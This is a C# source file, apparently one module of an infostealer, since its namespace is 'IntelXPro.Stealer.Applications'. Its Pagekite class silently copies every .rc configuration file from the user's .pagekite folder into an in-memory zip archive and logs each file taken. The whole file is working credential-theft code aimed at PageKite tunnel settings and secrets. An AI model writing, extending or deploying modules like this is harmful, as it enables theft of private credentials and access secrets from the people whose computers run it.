using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class Pagekite : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string userProfilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".pagekite");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Pagekite";

            bool foundData = false;

            if (Directory.Exists(userProfilePath))
            {
                try
                {
                    string[] rcFiles = Directory.GetFiles(userProfilePath, "*.rc", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in rcFiles)
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = $"Applications\\Pagekite\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }
                catch
                {
                }
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
